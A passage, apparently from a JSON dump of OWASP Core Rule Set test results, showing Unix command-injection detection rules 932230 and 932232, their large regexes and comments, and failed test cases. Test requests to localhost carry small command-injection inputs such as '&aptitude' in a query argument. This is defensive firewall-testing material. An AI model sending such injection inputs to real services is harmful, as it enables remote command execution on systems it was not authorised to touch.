\{]*)?\\x5c?d|z)|y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|l[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:4[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?))(?:[\\s\\x0b&\\),<>\\|]|$).*|a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?-[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*)|g[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|[hr][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932230
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection (2-3 chars)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932232",
    "test_id" : 3,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932232.yaml",
    "description" : "/?arg=&w (x",
    "cause" : "failed expect_id check: 932232 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "/?arg=&w (x",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?arg=%26w%20%28x",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932232 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932232,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule targets pefix + commans that are prone to false positive detection at PL3."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932232.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932232"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?2[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s)|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?f|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o|(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932232
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/3"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl3=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932232",
    "test_id" : 4,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932232.yaml",
    "description" : "/?arg=&aptitude",
    "cause" : "failed expect_id check: 932232 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=932238 - Remote Command Execution: Unix Shell Code Found in REQUEST_HEADERS" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "/?arg=&aptitude",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "Proxy-Connection" : "keep-alive",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?arg=%26aptitude",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932232 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932232,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule targets pefix + commans that are prone to false positive detection at PL3."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932232.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932232"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
